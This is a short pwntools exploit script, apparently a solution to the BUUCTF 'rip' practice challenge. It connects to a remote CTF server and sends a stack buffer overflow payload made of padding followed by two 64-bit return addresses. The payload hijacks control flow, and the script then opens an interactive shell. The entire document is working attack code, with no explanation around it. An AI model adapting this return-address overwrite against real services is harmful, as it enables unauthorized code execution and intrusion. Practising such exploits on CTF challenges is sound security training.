from pwn import *
# r=process('./buuctf-rip/pwn1')
r=remote("node5.buuoj.cn",26432)

# care bytes and str in python3 
p1=b'a'*(0xf+0x8)+p64(0x0401185) + p64(0x0401186) 

r.sendline(p1)

r.interactive()